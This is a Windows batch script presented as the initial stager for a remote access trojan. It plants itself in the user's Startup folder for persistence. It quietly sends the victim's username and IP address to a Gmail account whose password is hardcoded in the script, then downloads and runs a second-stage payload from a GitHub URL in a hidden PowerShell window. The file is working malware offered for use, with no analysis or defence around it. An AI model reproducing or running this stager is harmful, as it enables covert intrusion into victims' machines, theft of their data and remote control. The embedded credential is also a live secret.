@echo off

@rem initial stager for the rat

set InitialPath=%cd%
set StartupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup

@rem go to startup
cd %StartupDir%

@rem Initial reconnaissance
powershell.exe -nop -ep bypass -c "&{$email='defalttests@gmail.com';$password='nkos qxgo yxvo brmr';$subject=\"$env:username logs\";$ip=(Get-NetIPAddress -AddressFamily IPv4|?{$_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1'}).IPAddress|Select -Last 1|Out-String;$smtp=New-Object system.net.mail.smtpclient('smtp.gmail.com','587');$smtp.enableSSL=$true;$smtp.credentials=New-Object system.net.networkcredential($email,$password);$smtp.send($email,$email,$subject,$ip)}"

@rem Download payload
powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/files/wget.cmd' -outfile '.\wget.cmd'"

@rem run the payload
powershell -noprofile start-process powershell.exe -windowstyle hidden ".\wget.cmd"

pause

@rem move back to saved directory
cd %InitialPath%

@REM del initial.cmd
pause
@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM )>payload.cmd

